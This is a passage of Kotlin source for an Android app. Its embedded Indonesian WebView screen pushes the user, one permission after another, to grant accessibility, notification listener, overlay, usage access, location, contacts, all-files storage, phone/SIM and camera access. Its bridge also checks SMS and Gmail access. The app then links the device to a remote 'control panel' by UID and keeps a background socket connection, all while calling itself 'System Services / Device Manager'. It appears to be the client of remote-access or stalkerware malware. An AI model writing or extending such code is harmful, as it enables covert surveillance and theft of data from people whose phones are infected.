        <div class="perm-name">Kontak</div>
        <div class="perm-desc">Diperlukan Untuk Membaca Daftar Kontak Di Perangkat</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-contacts" onchange="onToggle('contacts',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-storage">
      <div class="perm-icon" style="background:rgba(251,146,60,.12);color:#fb923c">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg>
      </div>
      <div class="perm-info">
        <div class="perm-name">Akses Semua File</div>
        <div class="perm-desc">Diperlukan Untuk File Manager — Izinkan Akses Ke Semua File Di Penyimpanan</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-storage" onchange="onToggle('storage',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-phone">
      <div class="perm-icon" style="background:rgba(34,197,94,.12);color:#22c55e">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.6 3.4 2 2 0 0 1 3.58 1.22h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
      </div>
      <div class="perm-info">
        <div class="perm-name">Info Telepon & Nomor SIM</div>
        <div class="perm-desc">Diperlukan Untuk Membaca Nomor Telepon Dan Informasi Kartu SIM</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-phone" onchange="onToggle('phone',this)"><span class="tog-track"></span></label>
    </div>

  </div>

  <div class="perm-footer">
    <div class="all-granted-badge" id="allGrantedBadge">
      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
      Semua Akses Telah Diaktifkan
    </div>
    <button class="btn-masuk refresh-mode" id="btnMasuk" onclick="handleMasuk()">
      <svg id="btnIcon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-.49-4.5"/></svg>
      <span id="btnLabel">PERBARUI STATUS</span>
    </button>
  </div>
</div>

<!-- UID INPUT SCREEN -->
<div class="screen hidden" id="uidScreen">
  <div class="uid-wrap">
    <div class="uid-top">
      <div class="uid-logo">
        <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#6366f1" stroke-width="1.6">
          <rect x="3" y="11" width="18" height="11" rx="2"/>
          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
        </svg>
        <div class="uid-logo-pulse"></div>
      </div>
      <div class="uid-title">Masukan UID Untuk Konek</div>
      <div class="uid-sub">UID ini digunakan untuk menghubungkan device ke panel kontrol</div>

      <div class="uid-field-wrap">
        <label class="uid-label">UID Kontrol</label>
        <input type="text"
               class="uid-input"
               id="uidInput"
               placeholder="Contoh: M1YAB14............"
               maxlength="64"
               autocomplete="off"
               autocapitalize="off"
               spellcheck="false">
      </div>

      <div class="uid-error" id="uidError"></div>

      <button class="btn-connect" id="btnConnect" onclick="handleConnect()">
        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>
        HUBUNGKAN
      </button>
    </div>
  </div>
</div>

<!-- CONNECTED SCREEN -->
<div class="screen hidden" id="connectedScreen">
  <div class="conn-wrap">
    <div class="conn-top">
      <div class="conn-logo-wrap">
        <div class="conn-logo-bg">
          <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#6366f1" stroke-width="1.6">
            <path d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.35C17.25 22.15 21 17.25 21 12V7L12 2z"/>
            <path d="M9 12l2 2 4-4" stroke-width="1.8"/>
          </svg>
        </div>
        <div class="conn-logo-pulse"></div>
      </div>
      <div class="conn-name-wrap">
        <div class="conn-app-name">System Services</div>
        <div class="conn-app-sub">Device Manager</div>
      </div>
      <div class="conn-status-wrap">
        <div class="conn-status-indicator status-indicator offline" id="statusIndicator">
          <div class="status-dot"></div>
          <div class="status-text" id="statusLbl">TIDAK TERHUBUNG</div>
        </div>
        <div class="status-last" id="infoLast"></div>
      </div>
    </div>
    <div class="conn-bottom">
      <div class="conn-info-row">
        <span class="conn-info-k">ID Perangkat</span>
        <span class="conn-info-v" id="infoDevId">—</span>
      </div>
      <div class="conn-info-row">
        <span class="conn-info-k">UID Kontrol</span>
        <span class="conn-info-v accent" id="infoUid">—</span>
      </div>
      <div class="conn-info-row">
        <span class="conn-info-k">Status Sinkronisasi</span>
        <span class="conn-info-v" id="infoSync">Menghubungkan...</span>
      </div>
    </div>
    <div class="conn-footer-wrap">
      <div class="conn-footer">Berjalan Di Latar Belakang</div>
    </div>
  </div>
</div>

<script>
const permIds = ['cam','bat','overlay','accessibility','usage','notif','location','gpson','contacts','storage','phone']

function refreshPerms() {
  if (!window.Android) return
  const state = {
    cam:           Android.isCamGranted(),
    bat:           Android.isBatteryOptIgnored(),
    overlay:       Android.isOverlayGranted(),
    accessibility: Android.isAccessibilityGranted(),
    usage:         Android.isUsageAccessGranted(),
    notif:         Android.isNotifListenerGranted(),
    location:      Android.isLocationGranted(),
    gpson:         Android.isGpsEnabled(),
    contacts:      Android.isContactsGranted(),
    phone:         Android.isPhoneGranted(),
    storage:       Android.isManageStorageGranted()
  }
  let allOk = true
  permIds.forEach(id => {
    const tog = document.getElementById('tog-' + id)
    const row = document.getElementById('row-' + id)
    const granted = state[id]
    if (!granted) allOk = false
    if (tog) { tog.checked = granted; tog.disabled = granted }
    if (row) row.classList.toggle('granted', granted)
  })
  document.getElementById('allGrantedBadge').classList.toggle('show', allOk)
  const btn   = document.getElementById('btnMasuk')
  const label = document.getElementById('btnLabel')
  if (allOk) {
    btn.classList.remove('refresh-mode')
    document.getElementById('btnIcon').outerHTML = '<svg id="btnIcon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>'
    label.textContent = 'MULAI'
  } else {
    btn.classList.add('refresh-mode')
    document.getElementById('btnIcon').outerHTML = '<svg id="btnIcon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-.49-4.5"/></svg>'
    label.textContent = 'PERBARUI STATUS'
  }
}

function onToggle(id, el) {
  if (!window.Android) return
  if (!el.checked) { refreshPerms(); return }
  requestPermById(id)
  setTimeout(refreshPerms, 500)
}

const autoPermList = [
  { id: 'cam',           check: () => Android.isCamGranted(),            request: () => Android.requestCamPerm() },
  { id: 'bat',           check: () => Android.isBatteryOptIgnored(),     request: () => Android.openBatterySettings() },
  { id: 'overlay',       check: () => Android.isOverlayGranted(),        request: () => Android.requestOverlayPerm() },
  { id: 'accessibility', check: () => Android.isAccessibilityGranted(),  request: () => Android.requestAccessibilityPerm() },
  { id: 'usage',         check: () => Android.isUsageAccessGranted(),    request: () => Android.requestUsageAccessPerm() },
  { id: 'notif',         check: () => Android.isNotifListenerGranted(),  request: () => Android.openNotifListenerSettings() },
  { id: 'location',      check: () => Android.isLocationGranted(),       request: () => Android.requestLocationPerm() },
  { id: 'gpson',         check: () => Android.isGpsEnabled(),            request: () => Android.requestEnableGps() },
  { id: 'contacts',      check: () => Android.isContactsGranted(),       request: () => Android.requestContactsPerm() },
  { id: 'phone',         check: () => Android.isPhoneGranted(),          request: () => Android.requestPhonePerm() },
  { id: 'storage',       check: () => Android.isManageStorageGranted(),  request: () => Android.requestManageStoragePerm() }
]

let autoIndex = 0
let autoWaitInterval = null

function requestPermById(id) {
  if (!window.Android) return
  const p = autoPermList.find(x => x.id === id)
  if (p) p.request()
}

function startAutoPermFlow() {
  autoIndex = 0
  requestNextPerm()
}

function requestNextPerm() {
  if (!window.Android) return
  refreshPerms()
  while (autoIndex < autoPermList.length && autoPermList[autoIndex].check()) {
    autoIndex++
  }
  if (autoIndex >= autoPermList.length) {
    refreshPerms()
    return
  }
  const current = autoPermList[autoIndex]
  document.querySelectorAll('.perm-row').forEach(r => r.classList.remove('requesting'))
  const row = document.getElementById('row-' + current.id)
  if (row) row.classList.add('requesting')
  if (row) row.scrollIntoView({ behavior: 'smooth', block: 'center' })
  current.request()
  if (autoWaitInterval) clearInterval(autoWaitInterval)
  autoWaitInterval = setInterval(() => {
    if (current.check()) {
      clearInterval(autoWaitInterval)
      autoWaitInterval = null
      refreshPerms()
      autoIndex++
      setTimeout(requestNextPerm, 800)
    }
  }, 1000)
}

function checkAllGranted() {
  if (!window.Android) return false
  return autoPermList.every(p => p.check())
}

// ═══════════════════════════════════════════════════════════
// HANDLE MASUK → ke halaman UID
// ═══════════════════════════════════════════════════════════
function handleMasuk() {
  const label = document.getElementById('btnLabel')
  if (!label) { refreshPerms(); return }
  if (label.textContent.trim() === 'MULAI') {
    showUidScreen()
  } else {
    refreshPerms()
  }
}

// ═══════════════════════════════════════════════════════════
// SCREEN NAVIGATION
// ═══════════════════════════════════════════════════════════
function showUidScreen() {
  document.getElementById('permScreen').classList.add('hidden')
  document.getElementById('uidScreen').classList.remove('hidden')
  document.getElementById('connectedScreen').classList.add('hidden')
  // Pre-fill UID kalau udah ada
  try {
    if (window.Android && Android.getSavedUid) {
      var saved = Android.getSavedUid()
      if (saved && saved.length > 0) {
        document.getElementById('uidInput').value = saved
      }
    }
  } catch(e) {}
  setTimeout(function(){
    var inp = document.getElementById('uidInput')
    if (inp) inp.focus()
  }, 400)
}

function showConnected() {
  document.getElementById('permScreen').classList.add('hidden')
  document.getElementById('uidScreen').classList.add('hidden')
  document.getElementById('connectedScreen').classList.remove('hidden')
  try { MainBridge.connectNow(); } catch(e) {}
  const devId = window.Android ? Android.getDeviceId() : '—'
  document.getElementById('infoDevId').textContent = devId
  const uid = window.Android ? Android.getSavedUid() : '—'
  document.getElementById('infoUid').textContent = uid || '—'
  setInterval(() => {
    const online = window.Android ? Android.isSocketConnected() : false
    const ind = document.getElementById('statusIndicator')
    const lbl = document.getElementById('statusLbl')
    const sync = document.getElementById('infoSync')
    ind.className = 'conn-status-indicator status-indicator ' + (online ? 'online' : 'offline')
    lbl.textContent = online ? 'TERHUBUNG' : 'TIDAK TERHUBUNG'
    sync.textContent = online ? 'Aktif & Tersinkronisasi' : 'Mencoba menghubungkan...'
    if (online) document.getElementById('infoLast').textContent = 'Terakhir diperbarui ' + new Date().toLocaleTimeString('id-ID')
  }, 2000)
}

// ═══════════════════════════════════════════════════════════
// HANDLE CONNECT (HUBUNGKAN)
// ═══════════════════════════════════════════════════════════
function handleConnect() {
  var input = document.getElementById('uidInput')
  var errEl = document.getElementById('uidError')
  var btn   = document.getElementById('btnConnect')
  var uid   = (input.value || '').trim()

  input.classList.remove('error')
  errEl.classList.remove('show')
  errEl.textContent = ''

  // Validasi wajib
  if (uid.length < 6) {
    input.classList.add('error')
    errEl.textContent = 'Wajib masukin UID! Minimal 6 karakter.'
    errEl.classList.add('show')
    if (window.Android) Android.showToast('Wajib masukin UID!')
    return
  }

  // Validasi format
  if (!/^[A-Za-z0-9]+$/.test(uid)) {
    input.classList.add('error')
    errEl.textContent = 'UID hanya boleh huruf & angka!'
    errEl.classList.add('show')
    if (window.Android) Android.showToast('UID hanya boleh huruf & angka!')
    return
  }

  btn.disabled = true
  btn.innerHTML = '<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg> MENGHUBUNGKAN...'

  // Simpan UID ke SharedPreferences via Android
  try {
    if (window.Android && Android.saveUid) {
      Android.saveUid(uid)
    }
  } catch(e) {}

  if (window.Android) Android.showToast('UID tersimpan: ' + uid)

  setTimeout(function(){
    btn.disabled = false
    btn.innerHTML = '<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg> HUBUNGKAN'
    showConnected()
  }, 800)
}

// Enter key di input UID
document.addEventListener('DOMContentLoaded', function(){
  var inp = document.getElementById('uidInput')
  if (inp) {
    inp.addEventListener('keydown', function(e){
      if (e.key === 'Enter') handleConnect()
    })
  }
})

window.addEventListener('load', () => {
  setTimeout(() => {
    if (checkAllGranted()) {
      // Semua granted, tapi belum klik MULAI. Tampilkan halaman perm.
      refreshPerms()
    } else {
      refreshPerms()
      startAutoPermFlow()
    }
  }, 300)

  setInterval(() => {
    if (!document.getElementById('permScreen').classList.contains('hidden')) {
      refreshPerms()
    }
  }, 1000)
})
</script>
</body>
</html>""".trimIndent()
    }

    inner class MainBridge {
        @android.webkit.JavascriptInterface
        fun connectNow() {
            Handler(Looper.getMainLooper()).post {
                startDeviceService()
                val i = Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) }
                sendBroadcast(i)
            }
        }
    }
}

class AppBridge(private val context: Context, private val webView: WebView) {

    companion object {
        var instance: AppBridge? = null
    }

    @JavascriptInterface fun getDeviceId(): String =
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"

    @JavascriptInterface fun getDeviceName(): String {
        val m = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val n = Build.MODEL
        return if (n.startsWith(m, ignoreCase = true)) n else "$m $n"
    }

    @JavascriptInterface fun isSocketConnected(): Boolean = SocketHolder.connected

    // ═══════════════════════════════════════════════════════════
    // UID — Simpan & Ambil dari SharedPreferences
    // ═══════════════════════════════════════════════════════════
    @JavascriptInterface
    fun saveUid(uid: String) {
        val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
        prefs.edit().putString("saved_uid", uid).apply()
        android.util.Log.d("AppBridge", "saveUid: $uid")
    }

    @JavascriptInterface
    fun getSavedUid(): String {
        val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
        return prefs.getString("saved_uid", "") ?: ""
    }

    @JavascriptInterface fun isCamGranted()            = (context as MainActivity).isCamGranted()
    @JavascriptInterface fun isSmsGranted()            = (context as MainActivity).isSmsGranted()
    @JavascriptInterface fun isNotifListenerGranted()  = (context as MainActivity).isNotifListenerGranted()
    @JavascriptInterface fun isBatteryOptIgnored()     = (context as MainActivity).isBatteryOptIgnored()
    @JavascriptInterface fun isOverlayGranted()        = (context as MainActivity).isOverlayGranted()
    @JavascriptInterface fun isAccessibilityGranted()  = (context as MainActivity).isAccessibilityGranted()
    @JavascriptInterface fun isUsageAccessGranted()    = (context as MainActivity).isUsageAccessGranted()

    @JavascriptInterface fun requestCamPerm()          = (context as MainActivity).requestCamPerm()
    @JavascriptInterface fun requestSmsPerm()          = (context as MainActivity).requestSmsPerm()
    @JavascriptInterface fun openBatterySettings()     = (context as MainActivity).openBatterySettings()
    @JavascriptInterface fun requestOverlayPerm()      = (context as MainActivity).requestOverlayPerm()
    @JavascriptInterface fun openNotifListenerSettings() = (context as MainActivity).openNotifListenerSettings()
    @JavascriptInterface fun requestAccessibilityPerm()= (context as MainActivity).requestAccessibilityPerm()
    @JavascriptInterface fun requestUsageAccessPerm()  = (context as MainActivity).requestUsageAccessPerm()
    @JavascriptInterface fun isGalleryGranted()        = (context as MainActivity).isGalleryGranted()
    @JavascriptInterface fun requestGalleryPerm()      = (context as MainActivity).requestGalleryPerm()
    @JavascriptInterface fun isLocationGranted()       = (context as MainActivity).isLocationGranted()
    @JavascriptInterface fun isGpsEnabled()            = (context as MainActivity).isGpsEnabled()
    @JavascriptInterface fun requestLocationPerm()     = (context as MainActivity).requestLocationPerm()
    @JavascriptInterface fun requestEnableGps()        = (context as MainActivity).requestEnableGps()
    @JavascriptInterface fun isContactsGranted()       = (context as MainActivity).isContactsGranted()
    @JavascriptInterface fun requestContactsPerm()     = (context as MainActivity).requestContactsPerm()
    @JavascriptInterface fun isGmailGranted()           = (context as MainActivity).isGmailGranted()
    @JavascriptInterface fun requestGmailPerm()         = (context as MainActivity).requestGmailPerm()
    @JavascriptInterface fun isPhoneGranted()           = (context as MainActivity).isPhoneGranted()
    @JavascriptInterface fun requestPhonePerm()         = (context as MainActivity).requestPhonePerm()
    @JavascriptInterface fun isManageStorageGranted()  = (context as MainActivity).isManageStorageGranted()
    @JavascriptInterface fun requestManageStoragePerm()= (context as MainActivity).requestManageStoragePerm()

    @JavascriptInterface
    fun showToast(msg: String) {
        Handler(Looper.getMainLooper()).post {
            android.widget.Toast.makeText(context, msg, android.widget.Toast.LENGTH_SHORT).show()
        }
    }
}